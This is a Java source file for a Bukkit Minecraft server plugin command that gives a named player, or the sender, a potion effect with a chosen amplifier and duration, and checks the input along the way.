package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;

import java.util.ArrayList;

public class Effect implements Command {
    @Override
    public int minAConsoleArgs() {
        return 4;
    }

    @Override
    public String[] getCommands() {
        return new String[]{"effect"};
    }

    @Override
    public String getDescription() {
        return "Give an effect to yourself or another player.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length < 3) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "effect <effect> <amplifier> <time> | effect <player> <effect> <amplifier> <time>");
            return;
        }

        Player player = executor;
        PotionEffectType type;
        int amplifier;
        int time;

        int index = 0;

        if (args.length == 3) {
            player = executor;
        } else if (args.length == 4) {
            index = 1;
            player = Bukkit.getPlayer(args[0]);

            if (player == null) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + "That player was not found!");
                return;
            }
        } else {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "effect <effect> <amplifier> <time> | effect <player> <effect> <amplifier> <time>");
            return;
        }

        try {
            type = PotionEffectType.getByName(args[index]);
        } catch (Exception e) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
            return;
        }

        if (type == null) {
            try {
                sender.sendMessage(Colors.Prefix + Colors.Failure + "Invalid potion type!");
                ArrayList<String> types = new ArrayList<>();

                if (PotionEffectType.values() == null) {
                    return;
                }

                for (PotionEffectType p : PotionEffectType.values()) {
                    if (p == null) {
                        continue;
                    }

                    if (p.getName() == null) {
                        continue;
                    }

                    types.add(p.getName().toLowerCase());
                }

                sender.sendMessage(Colors.Prefix + Colors.Caution + "Potion types are: " + String.join(", ", types) + ".");
            } catch (Exception e) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage() + " (tried to list potion effects, just ignore this)");
            }
            return;
        }

        try {
            amplifier = Integer.parseInt(args[index + 1]);
        } catch (Exception e) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
            return;
        }

        try {
            time = Integer.parseInt(args[index + 2]);

            time = time * 20;
        } catch (Exception e) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
            return;
        }

        Player finalPlayer = player;
        int finalTime = time;
        Bukkit.getScheduler().scheduleSyncDelayedTask(context.getZ_(), () -> {
            String name = finalPlayer.getName().equals(sender.getName()) ? "you" : finalPlayer.getName();

            try {
                finalPlayer.addPotionEffect(new PotionEffect(type, finalTime, amplifier, true, false));

                sender.sendMessage(
                        Colors.Prefix + Colors.Success + "Successfully gave " + name + " " +
                                type.getName().toLowerCase().replace("_", " ") + " with an amplifier " + amplifier + " and a time of " + finalTime + ".");
            } catch (Exception e) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
            }
        });
    }
}
